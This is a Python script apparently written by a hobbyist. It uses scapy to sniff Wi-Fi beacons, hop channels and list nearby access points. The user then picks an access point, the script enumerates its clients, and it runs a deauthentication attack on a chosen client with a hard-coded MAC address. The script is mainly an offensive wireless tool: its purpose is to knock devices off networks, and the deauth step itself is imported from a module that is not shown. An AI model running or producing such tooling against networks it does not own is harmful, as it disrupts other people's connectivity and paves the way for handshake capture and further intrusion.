from scapy.all import *
from threading import Thread
import time
import os
import inquirer
from find_ap_clients import find_ap_clients
import asyncio
from countdown_task import CountdownTask
import deauth_client

networks = {}  # note the double round-brackets
spacing = "{:<20} {:<40} {:<10} {:<10} {:<10}"


def callback(packet):
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2.upper()
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # get the crypto
        crypto = stats.get("crypto")
        if bssid not in networks:
            networks[bssid] = [ssid, dbm_signal, channel, crypto]
            print(spacing.format(bssid, ssid,
                  dbm_signal, channel, list(crypto)[0]))


def change_channel(total_time, interval):
    ch = 1
    for i in range(1, int(total_time/interval)):
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        # print("jopa")
        ch = ch % 14 + 1
        time.sleep(interval)


# def wrapper(total_time):
#     # time.sleep(total_time)
#     return True

#     def stop_sniff(self):
#         return False
#     return stop_sniff


def selectbssid():
    questions = [
        inquirer.List('app_bssid',
                      message="Select BSSID oof the access point",
                      choices=networks
                      ),
    ]
    return inquirer.prompt(questions)["app_bssid"]


# def snif():
#     sniffer_thread = AsyncSniffer(prn=callback, iface=interface)
#     sniffer_thread.start()
#     # time.sleep(5)
#     # sniffer_thread.stop()


# async def run():
#     # TODO: Activate monitoring from code by getting arguments
#     # interface name, check using iwconfig
#     interface = "wlan0mon"
#     total_time = 60

#     # async def main():
#     #     print('Hello ...')
#     #     await asyncio.sleep(1)
#     #     print('... World!')

#     # Python 3.7+
#     try:
#         loop = asyncio.get_event_loop()
#         loop.run_until_complete(await asyncio.wait_for(
#             asyncio.gather(
#                 change_channel(total_time, 0.5),
#                 snif()),
#             timeout=5.0,
#         ))

#         # await asyncio.sleep(3)  # <- f() and g() are already running!

#         # result_f, result_g = await asyncio.wait_for(
#         #     asyncio.gather( change_channel(total_time,0.5),
#         #     snif()),
#         #     timeout=5.0,
#         # )
#     except asyncio.TimeoutError:
#         print("oops took longer than 5s!")

#     loop.close()
#     # channel_changer = Thread(target=change_channel,args=(total_time,0.5))
#     # channel_changer.daemon = True

def selectbssiddual(values):
    questions = [
        inquirer.List('app_bssid',
                      message="Select BSSID oof the access point",
                      choices=values
                      ),
    ]
    return inquirer.prompt(questions)["app_bssid"]


if __name__ == "__main__":

    # TODO: Activate monitoring from code by getting arguments
    # interface name, check using iwconfig
    interface = "wlan0mon"
    total_time = 60

    channel_changer = Thread(target=change_channel, args=(total_time, 0.5))
    channel_changer.daemon = True
    channel_changer.start()

    print(spacing.format("BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"))
    sniffer_thread = AsyncSniffer(prn=callback, iface=interface)
    sniffer_thread.start()
    time.sleep(10)
    sniffer_thread.stop()

    ap_bssid = selectbssid()
    find_ap_task = find_ap_clients()
    find_ap_task.sniffAction(ap_bssid, 10)

    time.sleep(10)

    ap_bssid2 = selectbssiddual(find_ap_task.stations)
    deauth_client.deauth(ap_bssid2, "14:AE:DB:32:0A:8A")
    # Wait for actual termination (if needed)
    # t.join()
    print(ap_bssid2)
    # ap_bssid = selectbssid()
    # find_ap_clients(interface).sniffAction(ap_bssid)
